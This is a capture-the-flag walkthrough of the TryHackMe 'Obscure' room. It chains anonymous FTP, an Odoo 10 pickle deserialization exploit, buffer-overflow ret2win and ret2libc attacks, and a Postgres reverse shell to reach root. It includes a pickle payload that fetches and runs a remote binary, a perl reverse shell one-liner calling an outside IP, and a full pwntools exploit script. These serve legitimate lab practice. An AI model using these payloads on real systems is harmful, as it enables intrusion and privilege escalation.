# Obscure

https://tryhackme.com/room/obscured

Rated 'Medium' at time of writing.

This was a fun machine, and not just because I was the first to get the first flag (so called 'first blood'). Just a nice, multi-step room where I learned a bit even if I took a few wrong corners.

1. A scan reveals 21, 22 and 80. The FTP service allowed anonymous logins, and under it was a `notice.txt` and a `password` binary.

2. The binary can be pulled apart with strings or ghidra, and basically takes an unknown 'employee id' and returns a password. The password was easy to extract using Ghidra, where its stored as a local string in the password function.

3. On port 80 was an instance of the [Odoo CRM](https://www.odoo.com/), version 10. Its login page required an email and password, but there was also a link to manage databases. Via that, a backup of the DB could be taken which revealed a single user with a email. Using this and the password recovered in step 2, I could get access to the admin interface of the site.

4. There is a public exploit for this version of Odoo, https://www.exploit-db.com/exploits/44064. The steps are: 
- install an app called 'Database Anonymization'
- access 'anonymize database' from the settings page
- anonymize the database (there is a button that is not styled like the others with this as the label - took me a while to find it as I thought it was just a tab heading)
- refresh and then, when you want to de-anonymize the database, you upload a python pickle-serialized config file. Its via that serialized file that you can exploit a deserialization error.

This part of the room seemed to trip a lot of people up, but it's not too complicated. First, the instance of Odoo is running using python 2.7, so your pickle payload has to be built using this version. A python3 payload will not deserialize correctly.

Second, upon uploading the payload and then clicking deserialize, the site will display an error (bool is not iterable or something). This error *does not matter* for your payload exploitation, it will happen on success or failure.

And finally, the site is running on a restricted docker container, which means many common tools will not be present. E.g., no wget, no advanced version of bash or whatever. Think more simply, or even just test with something like a ping command or basic curl.

Anyway, this is the pickle exploit I used (and ran with python2.7 to get my uploadable payload). It downloads a [reverse_ssh](https://github.com/NHAS/reverse_ssh) client binary from my attack box and then runs it to give me a stable reverse shell:

```python
import pickle
import os
import base64
import pickletools

class Exploit(object):
	def __reduce__(self):
		return (os.system, (("curl 10.10.25.148:1234/client > /tmp/c;chmod +x /tmp/c;/tmp/c"),))

with open("exploit.pickle", "wb") as f:
	pickle.dump(Exploit(), f, pickle.HIGHEST_PROTOCOL)
```

5. Once on the box, there are a few aberrations: details that allow connection to a postgres service on a separate container, an an unknown SUID binary at `/ret`. Bringing ret back from the box to analyse (just by base64 encoding it and copying it back), its a basic [ret2win](https://ir0nstone.gitbook.io/notes/types/stack/ret2win) binary, 64bit, no position independant execution or anything. Essentually, just need to overflow its input with an address of a RET instruction (for stack alignment in 64 bit binaries) and then the address of the win function.
- to get the address of a ret instruction, you can use `objdump -d ret | grep ret`
- to get the address of the win function, either open it in ghidra, find the function and read its address, or use something like gdb or redare2 and just list the functions to get the address. As its not a position independent, these addresses will be the same on every run.
- ghidra can also show you the size of the buffer thats being read to, but you can also calculate this with msf-pattern_create and msf-pattern_offset.

The final payload was similar to: `{ python2 -c 'print "A" * 128 + "[RET instruction addr]\x00\x00\x00\x00\x00[win instruction addr]\x00\x00\x00\x00\x00"'; cat; } | /ret`. Note the extra zeros - each address is eight bytes, as this is a x64 binary. Secondaryly, the wrapping of the input in `{ data; cat; }` uses cat to keep the connection to the binary open, reading your subsequent input and writing it to the opened /bin/sh the win function starts.

6. This gets a shell as root inside the docker container, which is not particularly useful. There is a root.txt file which isn't one of the goals, just telling you that you are root inside the container.

At this point I got lost in a rabbit hole for a few hours. Inside the environment variables of the container are the connection details for the postgresql database, which is running on a different container. I was able to connect to this via `psql`, with the username `odoo` and the password from the env variables. I listed databases and connected to the one named 'main'. Odoo was a super user, which meant I could perform code execution. The target container was even more limited than the initial container, but I was able to get a reverse shell via perl with: `COPY cmdexec FROM PROGRAM 'perl -MIO -e ''$p=fork;exit,if($p);$c=new IO::Socket::INET(PeerAddr,"10.10.255.120:5555");STDIN->fdopen($c,r);$~->fdopen($c,w);system$_ while<>;''';`. Once on the box, there was no /dev/tcp or any other networking tools. However I was able to download files from my attack box using [openssl](https://gtfobins.github.io/gtfobins/openssl/#file-download). So I ended up with a nice stable shell on the second box, but this was entirely pointless :)

7. Instead, what I should have noticed was that the first container had nmap available, which is unusual but a strong hint that I should be scanning something. Using it on 172.17.0.1, the presumable host machine, revealed an unusual port that, when connected to with nc, repeated the same intro text that the /ret binary would print. So, I ran `{ python2 -c 'print "A" * 128 + "[RET instruction addr]\x00\x00\x00\x00\x00[win instruction addr]\x00\x00\x00\x00\x00"'; cat; } | nc 172.17.0.1 [port]` and had a shell as zeeshan on the host machine.

8. As zeeshan, I could read the id_rsa private key from their .ssh directory, and therefore easily ssh directly onto the machine from my attack box directly.

9. In zeeshan's home directory was a binary named `exploit_me`. The zeeshan user had the ability to run this binary as root via sudo.

Pulling the binary back for analysis, a quick check showed it was as basic as the initial binary, but without a win function. Instead its a form of [ret2libc](https://ir0nstone.gitbook.io/notes/types/stack/return-oriented-programming/ret2libc), where you jump to system with the location of a /bin/sh string to spawn a shell. However, as ASLR was enabled on the box, and libc itself has a randomised address, first I needed to extract libc's location using a technique called [ret2plt](https://ir0nstone.gitbook.io/notes/types/stack/aslr/ret2plt-aslr-bypass), where you overflow with the address of puts to print an address from the GOT (which holds addresses of functions in libc to use, like puts itself). This will print the address which you can read, and if you set the return address to the main function, the program will repeat itself without re-randomising the libc address. At this point you can provide another payload to perform an actual ret2libc with your calculated libc base address.

I struggled a bit with this, just due to a key mistake: ALWAYS grab the actual libc library from the target machine to use as part of your exploit. Even if your attack box and the target have the same basic architecture and a similarly named libc library, even a tiny difference will bone your exploit and you will get a seg fault.

Anyway, here was the final script I used, which used zeeshan's private key to connect to the remote box and exploit the binary. Note that I had copied the libc from the box locally, and that the way I open the binary is slightly complicated as I need pwntools to correctly work with exploit_me while also invoking it using sudo on the target:

```python
from pwn import *

libc = ELF('libc.so')

s = ssh(host='10.10.184.28',user='zeeshan',keyfile='~/zeeshan.key')
p = s.process('/home/zeeshan/exploit_me')

elf = context.binary = p.elf
rop = ROP(elf)

p = s.process(argv='sudo /home/zeeshan/exploit_me',shell=True)

padding = b'A'*40
payload = padding
payload += p64(rop.find_gadget(['pop rdi', 'ret'])[0])
payload += p64(elf.got.gets)
payload += p64(elf.plt.puts)
payload += p64(elf.symbols.main)

print(p.recvline())
p.sendline(payload)
leak = u64(p.recvline().strip().ljust(8,b'\0'))
p.recvline()

log.info(f'Gets leak => {hex(leak)}')
libc.address = leak - libc.symbols.gets
log.info(f'Libc base => {hex(libc.address)}')

payload = padding
payload += p64(rop.find_gadget(['pop rdi', 'ret'])[0])
payload += p64(next(libc.search(b'/bin/sh')))
payload += p64(rop.find_gadget(['ret'])[0])
payload += p64(libc.symbols.system)

p.sendline(payload)
p.interactive()
```

This is basically copy/pasted with some minor alterations from the [ret2libc](https://tryhackme.com/room/ret2libc) room on TryHackMe, though task 8 on [pwn101](https://tryhackme.com/room/pwn101) from THM is also very similar.
